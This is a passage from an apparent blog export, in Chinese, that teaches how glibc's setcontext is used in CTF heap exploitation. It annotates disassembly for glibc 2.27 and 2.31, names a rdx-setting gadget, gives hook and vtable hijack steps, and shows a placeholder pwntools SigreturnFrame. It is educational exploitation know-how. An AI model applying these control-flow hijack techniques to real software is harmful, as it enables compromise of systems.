rdx,QWORD PTR [rdx+0x88]\n   0x0000000000055031 <+273>:\trdsspq rax\n   0x0000000000055036 <+278>:\tcmp    r10,QWORD PTR [rax]\n   0x0000000000055039 <+281>:\tmov    eax,0x0\n   0x000000000005503e <+286>:\tjne    0x55043 <setcontext+291>\n   0x0000000000055040 <+288>:\tpush   r10\n   0x0000000000055042 <+290>:\tret    \n   0x0000000000055043 <+291>:\tjmp    r10\n   0x0000000000055046 <+294>:\tmov    rcx,QWORD PTR [rdx+0xa8] # 跳转到这里继续\n   0x000000000005504d <+301>:\tpush   rcx\t\t\t\t\t  # 通过push rcx控制rip\n   0x000000000005504e <+302>:\tmov    rsi,QWORD PTR [rdx+0x70]\n   0x0000000000055052 <+306>:\tmov    rdi,QWORD PTR [rdx+0x68]\n   0x0000000000055056 <+310>:\tmov    rcx,QWORD PTR [rdx+0x98]\n   0x000000000005505d <+317>:\tmov    r8,QWORD PTR [rdx+0x28]\n   0x0000000000055061 <+321>:\tmov    r9,QWORD PTR [rdx+0x30]\n   0x0000000000055065 <+325>:\tmov    rdx,QWORD PTR [rdx+0x88]\n   0x000000000005506c <+332>:\txor    eax,eax\n   0x000000000005506e <+334>:\tret    \t\t\t\t\t\t  # 劫持程序流\n   0x000000000005506f <+335>:\tmov    rcx,QWORD PTR [rip+0x196dfa]        # 0x1ebe70\n   0x0000000000055076 <+342>:\tneg    eax\n   0x0000000000055078 <+344>:\tmov    DWORD PTR fs:[rcx],eax\n   0x000000000005507b <+347>:\tor     rax,0xffffffffffffffff\n   0x000000000005507f <+351>:\tret \n```\n\n由于2.29以后是以 **rdx 寄存器里的地址为基准**设置各个寄存器的值，而修改`__free_hook`或者`__malloc_hook`时往往只有一个参数，不能稳定地控制`rdx`，因此我们需要找一个`gadget`帮助我们将`rdi`的值赋给`rdx`。\n\n```asm\nmov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]\n```\n\n这个`gadget`在2.29和2.31中都有，它会将`rdi + 0x8`指向的内容赋值给`rdx`，最后会`call [rdx + 0x20]`。我们可以将这个`gadget`的地址写到`hook`中，并在`chunk+0x8`处写入`rdx`的值，并在`rdx+0x20`处写入`setcontext`。\n\n如果走`IO_FILE`，利用方法也差不多。不过走`_IO_switch_to_wget_mode `的链可以设置`rdx`，具体看`House of Cat`。\n\n## SigreturnFrame\n\n`SigreturnFrame`是`pwntools`中的一个控制寄存器的工具，常用在SROP中，这个工具实际上就是依靠`setcontext`实现的，我们可以用它来构造`setcontext`中的偏移，只需要在调用`setcontext`前将`rdi`或`rdx`指向`SigreturnFrame`，程序在执行`setcontext`时就会按照定义好的内容控制寄存器，用法如下：\n\n```python\nframe = SigreturnFrame()\nframe.rsp = xxx\nframe.rdi = xxx\nframe.rsi = xxx\nframe.rdx = xxx\nframe.rip = xxx\n```\n","slug":"setcontext","published":1,"updated":"2023-01-13T14:22:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagj005z5oud0esfhwao","content":"<p><code>setcontext</code>是<code>libc</code>中的一个函数，其中的部分代码可以用来给大部分寄存器进行赋值，不仅可以用于<strong>控制寄存器，还能劫持程序流</strong>，通常在**堆利用并且开启沙箱时用来劫持程序流走<code>orw</code>**。</p>\n<span id=\"more\"></span>\n\n<p><code>setcontext</code>大致可以把2.27，2.29做为两个分界点。在2.27及以前，<code>setcontext</code><strong>以寄存器<code>rdi</code>为基准，对寄存器进行赋值，从<code>setcontext+53</code>开始</strong>利用；在2.29及以后，<code>setcontext</code><strong>以寄存器<code>rdx</code>为基准，对寄存器进行赋值，并且利用的代码有些许区别，在2.31以后从<code>setcontext+61</code>开始</strong>利用。</p>\n<h2 id=\"glibc-2-27及以前\"><a href=\"#glibc-2-27及以前\" class=\"headerlink\" title=\"glibc-2.27及以前\"></a>glibc-2.27及以前</h2><p>这里以2.27-3ubuntu1.6_amd64为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000052050 &lt;+0&gt;:\t\tpush   rdi</span><br><span class=\"line\">0x0000000000052051 &lt;+1&gt;:\t\tlea    rsi,[rdi+0x128]</span><br><span class=\"line\">0x0000000000052058 &lt;+8&gt;:\t\txor    edx,edx</span><br><span class=\"line\">0x000000000005205a &lt;+10&gt;:\tmov    edi,0x2</span><br><span class=\"line\">0x000000000005205f &lt;+15&gt;:\tmov    r10d,0x8</span><br><span class=\"line\">0x0000000000052065 &lt;+21&gt;:\tmov    eax,0xe</span><br><span class=\"line\">0x000000000005206a &lt;+26&gt;:\tsyscall </span><br><span class=\"line\">0x000000000005206c &lt;+28&gt;:\tpop    rdi</span><br><span class=\"line\">0x000000000005206d &lt;+29&gt;:\tcmp    rax,0xfffffffffffff001</span><br><span class=\"line\">0x0000000000052073 &lt;+35&gt;:\tjae    0x520d0 &lt;setcontext+128&gt;</span><br><span class=\"line\">0x0000000000052075 &lt;+37&gt;:\tmov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class=\"line\">0x000000000005207c &lt;+44&gt;:\tfldenv [rcx]</span><br><span class=\"line\">0x000000000005207e &lt;+46&gt;:\tldmxcsr DWORD PTR [rdi+0x1c0]   # 会造成程序执行时直接 crash</span><br><span class=\"line\">0x0000000000052085 &lt;+53&gt;:\tmov    rsp,QWORD PTR [rdi+0xa0] # 利用从这里开始</span><br><span class=\"line\">0x000000000005208c &lt;+60&gt;:\tmov    rbx,QWORD PTR [rdi+0x80]</span><br><span class=\"line\">0x0000000000052093 &lt;+67&gt;:\tmov    rbp,QWORD PTR [rdi+0x78]</span><br><span class=\"line\">0x0000000000052097 &lt;+71&gt;:\tmov    r12,QWORD PTR [rdi+0x48]</span><br><span class=\"line\">0x000000000005209b &lt;+75&gt;:\tmov    r13,QWORD PTR [rdi+0x50]</span><br><span class=\"line\">0x000000000005209f &lt;+79&gt;:\tmov    r14,QWORD PTR [rdi+0x58]</span><br><span class=\"line\">0x00000000000520a3 &lt;+83&gt;:\tmov    r15,QWORD PTR [rdi+0x60]</span><br><span class=\"line\">0x00000000000520a7 &lt;+87&gt;:\tmov    rcx,QWORD PTR [rdi+0xa8]\t</span><br><span class=\"line\">0x00000000000520ae &lt;+94&gt;:\tpush   rcx \t\t\t\t\t   # 这里入栈后ret会ret到该地址</span><br><span class=\"line\">0x00000000000520af &lt;+95&gt;:\tmov    rsi,QWORD PTR [rdi+0x70]</span><br><span class=\"line\">0x00000000000520b3 &lt;+99&gt;:\tmov    rdx,QWORD PTR [rdi+0x88]</span><br><span class=\"line\">0x00000000000520ba &lt;+106&gt;:\tmov    rcx,QWORD PTR [rdi+0x98]</span><br><span class=\"line\">0x00000000000520c1 &lt;+113&gt;:\tmov    r8,QWORD PTR [rdi+0x28]</span><br><span class=\"line\">0x00000000000520c5 &lt;+117&gt;:\tmov    r9,QWORD PTR [rdi+0x30]</span><br><span class=\"line\">0x00000000000520c9 &lt;+121&gt;:\tmov    rdi,QWORD PTR [rdi+0x68]</span><br><span class=\"line\">0x00000000000520cd &lt;+125&gt;:\txor    eax,eax</span><br><span class=\"line\">0x00000000000520cf &lt;+127&gt;:\tret    \t\t\t\t\t\t   # ret 劫持程序流</span><br><span class=\"line\">0x00000000000520d0 &lt;+128&gt;:\tmov    rcx,QWORD PTR [rip+0x398d91]        # 0x3eae68</span><br><span class=\"line\">0x00000000000520d7 &lt;+135&gt;:\tneg    eax</span><br><span class=\"line\">0x00000000000520d9 &lt;+137&gt;:\tmov    DWORD PTR fs:[rcx],eax</span><br><span class=\"line\">0x00000000000520dc &lt;+140&gt;:\tor     rax,0xffffffffffffffff</span><br><span class=\"line\">0x00000000000520e0 &lt;+144&gt;:\tret </span><br></pre></td></tr></table></figure>\n\n<p>从<code>&lt;setcontext+53&gt;~&lt;setcontext+127&gt;</code>都是我们的利用范围，可以看到这部分代码以 <strong>rdi 寄存器里的地址为基准</strong>设置各个寄存器的值，其中**<code>push rcx</code>和后面的<code>ret</code>会使得<code>rip=rcx</code><strong>，而且<code>setcontext</code>最后会</strong><code>xor eax, eax</code>对<code>eax</code>进行赋0**。</p>\n<p>大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题，可以将<code>setcontext + 53</code>写进<code>__free_hook</code>或<code>__malloc_hook</code>中，然后建立或释放一个<code>chunk</code>，此时的<code>rdi</code>就会是该<code>chunk</code>的（<code>user_data?</code>）开头，如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序流。</p>\n<p>如果需要打<code>IO</code>流的话，我们可以将<code>setcontext + 53</code>写入<code>vtable</code>中，后面执行该<code>IO</code>函数时，<code>rdi</code>就会是<code>fp</code>，指向<code>IO_FILE</code>，如果我们伪造好了<code>IO_FILE</code>，同样可以劫持程序流。</p>\n<h2 id=\"glibc-2-29及以后\"><a href=\"#glibc-2-29及以后\" class=\"headerlink\" title=\"glibc-2.29及以后\"></a>glibc-2.29及以后</h2><p>这里以2.31-0ubuntu9.9_amd64为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000054f20 &lt;+0&gt;:\t\tendbr64 </span><br><span class=\"line\">0x0000000000054f24 &lt;+4&gt;:\t\tpush   rdi</span><br><span class=\"line\">0x0000000000054f25 &lt;+5&gt;:\t\tlea    rsi,[rdi+0x128]</span><br><span class=\"line\">0x0000000000054f2c &lt;+12&gt;:\txor    edx,edx</span><br><span class=\"line\">0x0000000000054f2e &lt;+14&gt;:\tmov    edi,0x2</span><br><span class=\"line\">0x0000000000054f33 &lt;+19&gt;:\tmov    r10d,0x8</span><br><span class=\"line\">0x0000000000054f39 &lt;+25&gt;:\tmov    eax,0xe</span><br><span class=\"line\">0x0000000000054f3e &lt;+30&gt;:\tsyscall </span><br><span class=\"line\">0x0000000000054f40 &lt;+32&gt;:\tpop    rdx</span><br><span class=\"line\">0x0000000000054f41 &lt;+33&gt;:\tcmp    rax,0xfffffffffffff001</span><br><span class=\"line\">0x0000000000054f47 &lt;+39&gt;:\tjae    0x5506f &lt;setcontext+335&gt;</span><br><span class=\"line\">0x0000000000054f4d &lt;+45&gt;:\tmov    rcx,QWORD PTR [rdx+0xe0]</span><br><span class=\"line\">0x0000000000054f54 &lt;+52&gt;:\tfldenv [rcx]</span><br><span class=\"line\">0x0000000000054f56 &lt;+54&gt;:\tldmxcsr DWORD PTR [rdx+0x1c0]</span><br><span class=\"line\">0x0000000000054f5d &lt;+61&gt;:\tmov    rsp,QWORD PTR [rdx+0xa0] # 利用从这里开始</span><br><span class=\"line\">0x0000000000054f64 &lt;+68&gt;:\tmov    rbx,QWORD PTR [rdx+0x80]</span><br><span class=\"line\">0x0000000000054f6b &lt;+75&gt;:\tmov    rbp,QWORD PTR [rdx+0x78]</span><br><span class=\"line\">0x0000000000054f6f &lt;+79&gt;:\tmov    r12,QWORD PTR [rdx+0x48]</span><br><span class=\"line\">0x0000000000054f73 &lt;+83&gt;:\tmov    r13,QWORD PTR [rdx+0x50]</span><br><span class=\"line\">0x0000000000054f77 &lt;+87&gt;:\tmov    r14,QWORD PTR [rdx+0x58]</span><br><span class=\"line\">0x0000000000054f7b &lt;+91&gt;:\tmov    r15,QWORD PTR [rdx+0x60]</span><br><span class=\"line\">0x0000000000054f7f &lt;+95&gt;:\ttest   DWORD PTR fs:0x48,0x2</span><br><span class=\"line\">0x0000000000054f8b &lt;+107&gt;:\tje     0x55046 &lt;setcontext+294&gt; # 这里会跳转走</span><br><span class=\"line\">0x0000000000054f91 &lt;+113&gt;:\tmov    rsi,QWORD PTR [rdx+0x3a8]</span><br><span class=\"line\">0x0000000000054f98 &lt;+120&gt;:\tmov    rdi,rsi</span><br><span class=\"line\">0x0000000000054f9b &lt;+123&gt;:\tmov    rcx,QWORD PTR [rdx+0x3b0]</span><br><span class=\"line\">0x0000000000054fa2 &lt;+130&gt;:\tcmp    rcx,QWORD PTR fs:0x78</span><br><span class=\"line\">0x0000000000054fab &lt;+139&gt;:\tje     0x54fe5 &lt;setcontext+197&gt;</span><br><span class=\"line\">0x0000000000054fad &lt;+141&gt;:\tmov    rax,QWORD PTR [rsi-0x8]</span><br><span class=\"line\">0x0000000000054fb1 &lt;+145&gt;:\tand    rax,0xfffffffffffffff8</span><br><span class=\"line\">0x0000000000054fb5 &lt;+149&gt;:\tcmp    rax,rsi</span><br><span class=\"line\">0x0000000000054fb8 &lt;+152&gt;:\tje     0x54fc0 &lt;setcontext+160&gt;</span><br><span class=\"line\">0x0000000000054fba &lt;+154&gt;:\tsub    rsi,0x8</span><br><span class=\"line\">0x0000000000054fbe &lt;+158&gt;:\tjmp    0x54fad &lt;setcontext+141&gt;</span><br><span class=\"line\">0x0000000000054fc0 &lt;+160&gt;:\tmov    rax,0x1</span><br><span class=\"line\">0x0000000000054fc7 &lt;+167&gt;:\tincsspq rax</span><br><span class=\"line\">0x0000000000054fcc &lt;+172&gt;:\trstorssp QWORD PTR [rsi-0x8]</span><br><span class=\"line\">0x0000000000054fd1 &lt;+177&gt;:\tsaveprevssp </span><br><span class=\"line\">0x0000000000054fd5 &lt;+181&gt;:\tmov    rax,QWORD PTR [rdx+0x3b0]</span><br><span class=\"line\">0x0000000000054fdc &lt;+188&gt;:\tmov    QWORD PTR fs:0x78,rax</span><br><span class=\"line\">0x0000000000054fe5 &lt;+197&gt;:\trdsspq rcx</span><br><span class=\"line\">0x0000000000054fea &lt;+202&gt;:\tsub    rcx,rdi</span><br><span class=\"line\">0x0000000000054fed &lt;+205&gt;:\tje     0x5500c &lt;setcontext+236&gt;</span><br><span class=\"line\">0x0000000000054fef &lt;+207&gt;:\tneg    rcx</span><br><span class=\"line\">0x0000000000054ff2 &lt;+210&gt;:\tshr    rcx,0x3</span><br><span class=\"line\">0x0000000000054ff6 &lt;+214&gt;:\tmov    esi,0xff</span><br><span class=\"line\">0x0000000000054ffb &lt;+219&gt;:\tcmp    rcx,rsi</span><br><span class=\"line\">0x0000000000054ffe &lt;+222&gt;:\tcmovb  rsi,rcx</span><br><span class=\"line\">0x0000000000055002 &lt;+226&gt;:\tincsspq rsi</span><br><span class=\"line\">0x0000000000055007 &lt;+231&gt;:\tsub    rcx,rsi</span><br><span class=\"line\">0x000000000005500a &lt;+234&gt;:\tja     0x54ffb &lt;setcontext+219&gt;</span><br><span class=\"line\">0x000000000005500c &lt;+236&gt;:\tmov    rsi,QWORD PTR [rdx+0x70]</span><br><span class=\"line\">0x0000000000055010 &lt;+240&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]</span><br><span class=\"line\">0x0000000000055014 &lt;+244&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]</span><br><span class=\"line\">0x000000000005501b &lt;+251&gt;:\tmov    r8,QWORD PTR [rdx+0x28]</span><br><span class=\"line\">0x000000000005501f &lt;+255&gt;:\tmov    r9,QWORD PTR [rdx+0x30]</span><br><span class=\"line\">0x0000000000055023 &lt;+259&gt;:\tmov    r10,QWORD PTR [rdx+0xa8]</span><br><span class=\"line\">0x000000000005502a &lt;+266&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]</span><br><span class=\"line\">0x0000000000055031 &lt;+273&gt;:\trdsspq rax</span><br><span class=\"line\">0x0000000000055036 &lt;+278&gt;:\tcmp    r10,QWORD PTR [rax]</span><br><span class=\"line\">0x0000000000055039 &lt;+281&gt;:\tmov    eax,0x0</span><br><span class=\"line\">0x000000000005503e &lt;+286&gt;:\tjne    0x55043 &lt;setcontext+291&gt;</span><br><span class=\"line\">0x0000000000055040 &lt;+288&gt;:\tpush   r10</span><br><span class=\"line\">0x0000000000055042 &lt;+290&gt;:\tret    </span><br><span class=\"line\">0x0000000000055043 &lt;+291&gt;:\tjmp    r10</span><br><span class=\"line\">0x0000000000055046 &lt;+294&gt;:\tmov    rcx,QWORD PTR [rdx+0xa8] # 跳转到这里继续</span><br><span class=\"line\">0x000000000005504d &lt;+301&gt;:\tpush   rcx\t\t\t\t\t  # 通过push rcx控制rip</span><br><span class=\"line\">0x000000000005504e &lt;+302&gt;:\tmov    rsi,QWORD PTR [rdx+0x70]</span><br><span class=\"line\">0x0000000000055052 &lt;+306&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]</span><br><span class=\"line\">0x0000000000055056 &lt;+310&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]</span><br><span class=\"line\">0x000000000005505d &lt;+317&gt;:\tmov    r8,QWORD PTR [rdx+0x28]</span><br><span class=\"line\">0x0000000000055061 &lt;+321&gt;:\tmov    r9,QWORD PTR [rdx+0x30]</span><br><span class=\"line\">0x0000000000055065 &lt;+325&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]</span><br><span class=\"line\">0x000000000005506c &lt;+332&gt;:\txor    eax,eax</span><br><span class=\"line\">0x000000000005506e &lt;+334&gt;:\tret    \t\t\t\t\t\t  # 劫持程序流</span><br><span class=\"line\">0x000000000005506f &lt;+335&gt;:\tmov    rcx,QWORD PTR [rip+0x196dfa]        # 0x1ebe70</span><br><span class=\"line\">0x0000000000055076 &lt;+342&gt;:\tneg    eax</span><br><span class=\"line\">0x0000000000055078 &lt;+344&gt;:\tmov    DWORD PTR fs:[rcx],eax</span><br><span class=\"line\">0x000000000005507b &lt;+347&gt;:\tor     rax,0xffffffffffffffff</span><br><span class=\"line\">0x000000000005507f &lt;+351&gt;:\tret </span><br></pre></td></tr></table></figure>\n\n<p>由于2.29以后是以 <strong>rdx 寄存器里的地址为基准</strong>设置各个寄存器的值，而修改<code>__free_hook</code>或者<code>__malloc_hook</code>时往往只有一个参数，不能稳定地控制<code>rdx</code>，因此我们需要找一个<code>gadget</code>帮助我们将<code>rdi</code>的值赋给<code>rdx</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure>\n\n<p>这个<code>gadget</code>在2.29和2.31中都有，它会将<code>rdi + 0x8</code>指向的内容赋值给<code>rdx</code>，最后会<code>call [rdx + 0x20]</code>。我们可以将这个<code>gadget</code>的地址写到<code>hook</code>中，并在<code>chunk+0x8</code>处写入<code>rdx</code>的值，并在<code>rdx+0x20</code>处写入<code>setcontext</code>。</p>\n<p>如果走<code>IO_FILE</code>，利用方法也差不多。不过走<code>_IO_switch_to_wget_mode </code>的链可以设置<code>rdx</code>，具体看<code>House of Cat</code>。</p>\n<h2 id=\"SigreturnFrame\"><a href=\"#SigreturnFrame\" class=\"headerlink\" title=\"SigreturnFrame\"></a>SigreturnFrame</h2><p><code>SigreturnFrame</code>是<code>pwntools</code>中的一个控制寄存器的工具，常用在SROP中，这个工具实际上就是依靠<code>setcontext</code>实现的，我们可以用它来构造<code>setcontext</code>中的偏移，只需要在调用<code>setcontext</code>前将<code>rdi</code>或<code>rdx</code>指向<code>SigreturnFrame</code>，程序在执行<code>setcontext</code>时就会按照定义好的内容控制寄存器，用法如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rsp = xxx</span><br><span class=\"line\">frame.rdi = xxx</span><br><span class=\"line\">frame.rsi = xxx</span><br><span class=\"line\">frame.rdx = xxx</span><br><span class=\"line\">frame.rip = xxx</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p><code>setcontext</code>是<code>libc</code>中的一个函数，其中的部分代码可以用来给大部分寄存器进行赋值，不仅可以用于<strong>控制寄存器，还能劫持程序流</strong>，通常在**堆利用并且开启沙箱时用来劫持程序流走<code>orw</code>**。</p>","more":"<p><code>setcontext</code>大致可以把2.27，2.29做为两个分界点。在2.27及以前，<code>setcontext</code><strong>以寄存器<code>rdi</code>为基准，对寄存器进行赋值，从<code>setcontext+53</code>开始</strong>利用；在2.29及以后，<code>setcontext</code><strong>以寄存器<code>rdx</code>为基准，对寄存器进行赋值，并且利用的代码有些许区别，在2.31以后从<code>setcontext+61</code>开始</strong>利用。</p>\n<h2 id=\"glibc-2-27及以前\"><a href=\"#glibc-2-27及以前\" class=\"headerlink\" title=\"glibc-2.27及以前\"></a>glibc-2.27及以前</h2><p>这里以2.27-3ubuntu1.6_amd64为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000052050 &lt;+0&gt;:\t\tpush   rdi</span><br><span class=\"line\">0x0000000000052051 &lt;+1&gt;:\t\tlea    rsi,[rdi+0x128]</span><br><span class=\"line\">0x0000000000052058 &lt;+8&gt;:\t\txor    edx,edx</span><br><span class=\"line\">0x000000000005205a &lt;+10&gt;:\tmov    edi,0x2</span><br><span class=\"line\">0x000000000005205f &lt;+15&gt;:\tmov    r10d,0x8</span><br><span class=\"line\">0x0000000000052065 &lt;+21&gt;:\tmov    eax,0xe</span><br><span class=\"line\">0x000000000005206a &lt;+26&gt;:\tsyscall </span><br><span class=\"line\">0x000000000005206c &lt;+28&gt;:\tpop    rdi</span><br><span class=\"line\">0x000000000005206d &lt;+29&gt;:\tcmp    rax,0xfffffffffffff001</span><br><span class=\"line\">0x0000000000052073 &lt;+35&gt;:\tjae    0x520d0 &lt;setcontext+128&gt;</span><br><span class=\"line\">0x0000000000052075 &lt;+37&gt;:\tmov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class=\"line\">0x000000000005207c &lt;+44&gt;:\tfldenv [rcx]</span><br><span class=\"line\">0x000000000005207e &lt;+46&gt;:\tldmxcsr DWORD PTR [rdi+0x1c0]   # 会造成程序执行时直接 crash</span><br><span class=\"line\">0x0000000000052085 &lt;+53&gt;:\tmov    rsp,QWORD PTR [rdi+0xa0] # 利用从这里开始</span><br><span class=\"line\">0x000000000005208c &lt;+60&gt;:\tmov    rbx,QWORD PTR [rdi+0x80]</span><br><span class=\"line\">0x0000000000052093 &lt;+67&gt;:\tmov    rbp,QWORD PTR [rdi+0x78]</span><br><span class=\"line\">0x0000000000052097 &lt;+71&gt;:\tmov    r12,QWORD PTR [rdi+0x48]</span><br><span class=\"line\">0x000000000005209b &lt;+75&gt;:\tmov    r13,QWORD PTR [rdi+0x50]</span><br><span class=\"line\">0x000000000005209f &lt;+79&gt;:\tmov    r14,QWORD PTR [rdi+0x58]</span><br><span class=\"line\">0x00000000000520a3 &lt;+83&gt;:\tmov    r15,QWORD PTR [rdi+0x60]</span><br><span class=\"line\">0x00000000000520a7 &lt;+87&gt;:\tmov    rcx,QWORD PTR [rdi+0xa8]\t</span><br><span class=\"line\">0x00000000000520ae &lt;+94&gt;:\tpush   rcx \t\t\t\t\t   # 这里入栈后ret会ret到该地址</span><br><span class=\"line\">0x00000000000520af &lt;+95&gt;:\tmov    rsi,QWORD PTR [rdi+0x70]</span><br><span class=\"line\">0x00000000000520b3 &lt;+99&gt;:\tmov    rdx,QWORD PTR [rdi+0x88]</span><br><span class=\"line\">0x00000000000520ba &lt;+106&gt;:\tmov    rcx,QWORD PTR [rdi+0x98]</span><br><span class=\"line\">0x00000000000520c1 &lt;+113&gt;:\tmov    r8,QWORD PTR [rdi+0x28]</span><br><span class=\"line\">0x00000000000520c5 &lt;+117&gt;:\tmov    r9,QWORD PTR [rdi+0x30]</span><br><span class=\"line\">0x00000000000520c9 &lt;+121&gt;:\tmov    rdi,QWORD PTR [rdi+0x68]</span><br><span class=\"line\">0x00000000000520cd &lt;+125&gt;:\txor    eax,eax</span><br><span class=\"line\">0x00000000000520cf &lt;+127&gt;:\tret    \t\t\t\t\t\t   # ret 劫持程序流</span><br><span class=\"line\">0x00000000000520d0 &lt;+128&gt;:\tmov    rcx,QWORD PTR [rip+0x398d91]        # 0x3eae68</span><br><span class=\"line\">0x00000000000520d7 &lt;+135&gt;:\tneg    eax</span><br><span class=\"line\">0x00000000000520d9 &lt;+137&gt;:\tmov    DWORD PTR fs:[rcx],eax</span><br><span class=\"line\">0x00000000000520dc &lt;+140&gt;:\tor     rax,0xffffffffffffffff</span><br><span class=\"line\">0x00000000000520e0 &lt;+144&gt;:\tret </span><br></pre></td></tr></table></figure>\n\n<p>从<code>&lt;setcontext+53&gt;~&lt;setcontext+127&gt;</code>都是我们的利用范围，可以看到这部分代码以 <strong>rdi 寄存器里的地址为基准</strong>设置各个寄存器的值，其中**<code>push rcx</code>和后面的<code>ret</code>会使得<code>rip=rcx</code><strong>，而且<code>setcontext</code>最后会</strong><code>xor eax, eax</code>对<code>eax</code>进行赋0**。</p>\n<p>大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题，可以将<code>setcontext + 53</code>写进<code>__free_hook</code>或<code>__malloc_hook</code>中，然后建立或释放一个<code>chunk</code>，此时的<code>rdi</code>就会是该<code>chunk</code>的（<code>user_data?</code>）开头，如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序流。</p>\n<p>如果需要打<code>IO</code>流的话，我们可以将<code>setcontext + 53</code>写入<code>vtable</code>中，后面执行该<code>IO</code>函数时，<code>rdi</code>就会是<code>fp</code>，指向<code>IO_FILE</code>，如果我们伪造好了<code>IO_FILE</code>，同样可以劫持程序流。</p>\n<h2 